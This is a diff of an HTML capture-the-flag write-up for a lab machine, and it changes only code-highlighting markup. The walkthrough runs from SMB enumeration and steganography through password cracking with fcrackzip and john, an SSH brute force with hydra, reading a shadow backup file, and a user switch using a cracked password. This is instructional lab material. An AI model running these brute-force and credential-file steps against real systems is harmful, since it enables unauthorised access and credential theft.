@@ -128,20 +128,20 @@
 <h2>Reconnaissance</h2>
 <p>The first step in any engagement is <strong>reconnaissance</strong>, which involves gathering information about the target system. We'll start with a network scan to identify open ports and services.</p>
 <p>We used <strong>Nmap</strong>, a powerful network scanning tool, to discover what services are running on the target machine at IP address <code>10.64.149.126</code>.</p>
-<pre class="codehilite"><code class="language-bash">PORT    STATE SERVICE      REASON
-22/tcp  open  ssh          syn-ack ttl 62
-139/tcp open  netbios-ssn  syn-ack ttl 62
-445/tcp open  microsoft-ds syn-ack ttl 62
+<div class="codehilite"><pre><span></span><code>PORT<span class="w">    </span>STATE<span class="w"> </span>SERVICE<span class="w">      </span>REASON
+<span class="m">22</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssh<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">62</span>
+<span class="m">139</span>/tcp<span class="w"> </span>open<span class="w">  </span>netbios-ssn<span class="w">  </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">62</span>
+<span class="m">445</span>/tcp<span class="w"> </span>open<span class="w">  </span>microsoft-ds<span class="w"> </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">62</span>
 
-Host script results:
-| smb-enum-shares: 
-|   note: ERROR: Enumerating shares failed, guessing at common ones (SMB: Failed to receive bytes: TIMEOUT)
-|   \\10.64.149.126\IPC$: 
-|     Type: STYPE_IPC_HIDDEN
-|     Comment: IPC Service (Samba 4.7.6-Ubuntu)
-|     Path: C:\tmp
-|_    Anonymous access: READ/WRITE
-</code></pre>
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span><span class="w"> </span>smb-enum-shares:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>note:<span class="w"> </span>ERROR:<span class="w"> </span>Enumerating<span class="w"> </span>shares<span class="w"> </span>failed,<span class="w"> </span>guessing<span class="w"> </span>at<span class="w"> </span>common<span class="w"> </span>ones<span class="w"> </span><span class="o">(</span>SMB:<span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>receive<span class="w"> </span>bytes:<span class="w"> </span>TIMEOUT<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="se">\\</span><span class="m">10</span>.64.149.126<span class="se">\I</span>PC$:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span>Type:<span class="w"> </span>STYPE_IPC_HIDDEN
+<span class="p">|</span><span class="w">     </span>Comment:<span class="w"> </span>IPC<span class="w"> </span>Service<span class="w"> </span><span class="o">(</span>Samba<span class="w"> </span><span class="m">4</span>.7.6-Ubuntu<span class="o">)</span>
+<span class="p">|</span><span class="w">     </span>Path:<span class="w"> </span>C:<span class="se">\t</span>mp
+<span class="p">|</span>_<span class="w">    </span>Anonymous<span class="w"> </span>access:<span class="w"> </span>READ/WRITE
+</code></pre></div>
 
 <h3>🧠 Beginner Analysis</h3>
 <ul>
@@ -162,13 +162,13 @@ Host script results:
 <p>Now that we've identified an open SMB share with anonymous read/write access, we'll dive deeper.</p>
 <h3>SMB Access</h3>
 <p>We can leverage the anonymous access to connect to the SMB share and explore its contents.</p>
-<pre class="codehilite"><code class="language-bash">smbclient //10.64.149.126/Anonymous -N -t 900
+<div class="codehilite"><pre><span></span><code>smbclient<span class="w"> </span>//10.64.149.126/Anonymous<span class="w"> </span>-N<span class="w"> </span>-t<span class="w"> </span><span class="m">900</span>
 
-Anonymous login successful
-smb: \&gt; ls
-  journal.txt                         N  3470998  Sun Feb  9 19:20:53 2020
-smb: \&gt; get journal.txt
-</code></pre>
+Anonymous<span class="w"> </span>login<span class="w"> </span>successful
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
+<span class="w">  </span>journal.txt<span class="w">                         </span>N<span class="w">  </span><span class="m">3470998</span><span class="w">  </span>Sun<span class="w"> </span>Feb<span class="w">  </span><span class="m">9</span><span class="w"> </span><span class="m">19</span>:20:53<span class="w"> </span><span class="m">2020</span>
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>get<span class="w"> </span>journal.txt
+</code></pre></div>
 
 <h3>🧠 Beginner Analysis</h3>
 <ul>
@@ -182,15 +182,15 @@ smb: \&gt; get journal.txt
 </ul>
 <h3>Steganography Analysis</h3>
 <p>The <code>journal.txt</code> file is quite large (over 3MB). This suggests it might contain hidden data. We'll investigate its content.</p>
-<pre class="codehilite"><code class="language-bash">cat journal.txt | base64 -d &gt; output
-file output
-# output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
-</code></pre>
+<div class="codehilite"><pre><span></span><code>cat<span class="w"> </span>journal.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>output
+file<span class="w"> </span>output
+<span class="c1"># output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced</span>
+</code></pre></div>
 
 <p>Using <code>stegpy</code>, we extract a hidden zip file.</p>
-<pre class="codehilite"><code class="language-bash">stegpy output         
-# File _journal.zip succesfully extracted from output
-</code></pre>
+<div class="codehilite"><pre><span></span><code>stegpy<span class="w"> </span>output<span class="w">         </span>
+<span class="c1"># File _journal.zip succesfully extracted from output</span>
+</code></pre></div>
 
 <h3>🧠 Beginner Analysis</h3>
 <ul>
@@ -213,20 +213,20 @@ file output
 <p>We've uncovered a hidden ZIP file. Now we need to figure out how to access its contents.</p>
 <h3>Cracking the Archive</h3>
 <p>The <code>_journal.zip</code> file might be protected by a password. We'll first check its integrity and then attempt to crack it.</p>
-<pre class="codehilite"><code class="language-bash">file _journal.zip                                            
-# _journal.zip: Zip archive data
-</code></pre>
+<div class="codehilite"><pre><span></span><code>file<span class="w"> </span>_journal.zip<span class="w">                                            </span>
+<span class="c1"># _journal.zip: Zip archive data</span>
+</code></pre></div>
 
 <p>Brute-forcing the zip password with <code>rockyou.txt</code>:</p>
-<pre class="codehilite"><code class="language-bash">fcrackzip -uDp /usr/share/wordlists/rockyou.txt  _journal.zip
-# PASSWORD FOUND!!!!: pw == september
-</code></pre>
+<div class="codehilite"><pre><span></span><code>fcrackzip<span class="w"> </span>-uDp<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w">  </span>_journal.zip
+<span class="c1"># PASSWORD FOUND!!!!: pw == september</span>
+</code></pre></div>
 
 <p>Inside we find <code>Journal.ctz</code>, a 7-Zip archive. Converting to hash and cracking:</p>
-<pre class="codehilite"><code class="language-bash">/usr/share/john/7z2john.pl Journal.ctz &gt; hash.txt
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-# tigerlily        (Journal.ctz)     
-</code></pre>
+<div class="codehilite"><pre><span></span><code>/usr/share/john/7z2john.pl<span class="w"> </span>Journal.ctz<span class="w"> </span>&gt;<span class="w"> </span>hash.txt
+john<span class="w"> </span>hash.txt<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+<span class="c1"># tigerlily        (Journal.ctz)     </span>
+</code></pre></div>
 
 <h3>🧠 Beginner Analysis</h3>
 <ul>
@@ -255,9 +255,9 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 </ul>
 <h3>SSH Bruteforce</h3>
 <p>With the password "tigerlily" and the decoded wordlists from the journal logs, we can now attempt to log in to the SSH service. It's a good practice to use usernames and passwords found in enumerated files. We'll try to brute-force the SSH login for the user <code>lily</code>.</p>
-<pre class="codehilite"><code class="language-bash">hydra -l lily -P cherry-blossom.txt ssh://10.64.149.126
-# [22][ssh] host: 10.64.149.126   login: lily   password: Mr.$un$hi..
-</code></pre>
+<div class="codehilite"><pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>lily<span class="w"> </span>-P<span class="w"> </span>cherry-blossom.txt<span class="w"> </span>ssh://10.64.149.126
+<span class="c1"># [22][ssh] host: 10.64.149.126   login: lily   password: Mr.$un$hi..</span>
+</code></pre></div>
 
 <h3>🧠 Beginner Analysis</h3>
 <ul>
@@ -271,15 +271,15 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 <p>We have a user-level shell via SSH. However, our ultimate goal is to gain root privileges to have full control over the system.</p>
 <h3>Hash Cracking</h3>
 <p>While exploring the compromised system, we find backup shadow files in <code>/var/backups</code>. These files often contain encrypted user passwords.</p>
-<pre class="codehilite"><code class="language-bash">/var/backups/shadow.bak
-johan:$6$zV7zbU1b...
-lily:$6$3GPkY0ZP...
-</code></pre>
+<div class="codehilite"><pre><span></span><code>/var/backups/shadow.bak
+johan:<span class="nv">$6$zV7zbU1b</span>...
+lily:<span class="nv">$6$3</span>GPkY0ZP...
+</code></pre></div>
 
 <p>Cracking the hashes gives us <code>johan</code>'s password.</p>
-<pre class="codehilite"><code class="language-bash">john --wordlist=cherry-blossom.txt hashes.txt
-# ##scuffleboo##   (johan)     
-</code></pre>
+<div class="codehilite"><pre><span></span><code>john<span class="w"> </span>--wordlist<span class="o">=</span>cherry-blossom.txt<span class="w"> </span>hashes.txt
+<span class="c1"># ##scuffleboo##   (johan)     </span>
+</code></pre></div>
 
 <h3>🧠 Beginner Analysis</h3>
 <ul>
@@ -298,10 +298,10 @@ lily:$6$3GPkY0ZP...
 </ul>
 <h3>Root Access</h3>
 <p>Now that we have the password for <code>johan</code>, we can switch to that user and look for a way to become root.</p>
-<pre class="codehilite"><code class="language-bash">lily@cherryblossom:~$ su johan
-# Password: ##scuffleboo##
-johan@cherryblossom:~$ cat user.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code>lily@cherryblossom:~$<span class="w"> </span>su<span class="w"> </span>johan
+<span class="c1"># Password: ##scuffleboo##</span>
+johan@cherryblossom:~$<span class="w"> </span>cat<span class="w"> </span>user.txt
+</code></pre></div>
 
 <h3>🧠 Beginner Analysis</h3>
 <ul>
